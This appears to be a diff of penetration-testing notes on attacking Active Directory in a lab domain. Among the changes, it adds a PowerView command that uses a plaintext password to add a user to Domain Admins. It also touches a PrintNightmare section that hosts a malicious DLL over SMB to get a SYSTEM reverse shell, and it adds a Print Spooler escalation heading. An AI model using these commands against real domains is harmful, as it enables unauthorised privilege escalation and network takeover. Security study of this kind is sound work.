@@ -15,6 +15,8 @@ tags:
 
 [Index of Active Directory](active-directory.md)
 
+[Hardening and auditing Active Directory ](hardening-auditing-active-directory.md)
+
 !!! tip "Attacking from linux"
 	- [Enumerating Active Directory from Linux](active-directory-from-linux-enumeration.md)
 	- [Attacking Active Directory from Linux](active-directory-from-linux-attacks.md)
@@ -650,11 +652,24 @@ AceQualifier          : AccessAllowed
 
 Members of the `Information Technology` group have `GenericAll` rights over the user `adunn`, which means we could:
 
-- Modify group membership
-- Force change a password
-- Perform a targeted Kerberoasting attack and attempt to crack the user's password if it is weak
+1. Modify group membership
+2. Force change a password
+3. Perform a targeted Kerberoasting attack and attempt to crack the user's password if it is weak
 
-Let's do a kerberoasting attack:
+##### 1. Modify group membership
+
+In this case the user CT059 will be adding the user AB920 as Domain Admin
+
+```powershell
+$SecPassword = ConvertTo-SecureString 'charlie1' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\CT059', $SecPassword)
+
+Import-Module .\PowerView.ps1
+Add-DomainGroupMember -Identity 'Domain Admins' -Members 'AB920' -Credential $Cred
+```
+
+
+##### 3. Kerberoasting attack 
 
 ```powershell
 # Creating a SecureString Object using damundsen
@@ -955,7 +970,7 @@ We will then host this payload in an SMB share we create on our attack host usin
 sudo smbserver.py -smb2support $ShareName /path/to/$FileName.dll
 # Example:
 # sudo smbserver.py -smb2support CompData /home/
-# This will leave out terminal in the host machine with no other use than that of sharing.
+# This will leave our terminal in the host machine with no other use than that of sharing.
 ```
 
 Then we will need to open a two new terminals in our attacker machine:
@@ -981,6 +996,10 @@ sudo python3 /opt/CVE-2021-1675/CVE-2021-1675.py $user/$user:$password@$domainCo
 ```
 
 The payload will then call back to our multi handler giving us an elevated SYSTEM shell.
+
+##  Print Spooler 
+The Print Spooler exploitation leverages the Windows Print Spooler service in conjunction with the SeImpersonatePrivilege privilege. The goal is to impersonate a SYSTEM token to escalate privileges. Tools like PrintSpoofer automate this process effectively. Below are detailed steps for exploiting this vulnerability:
+
 
 
 ## 🪤 NoPac (SamAccountName Spoofing)
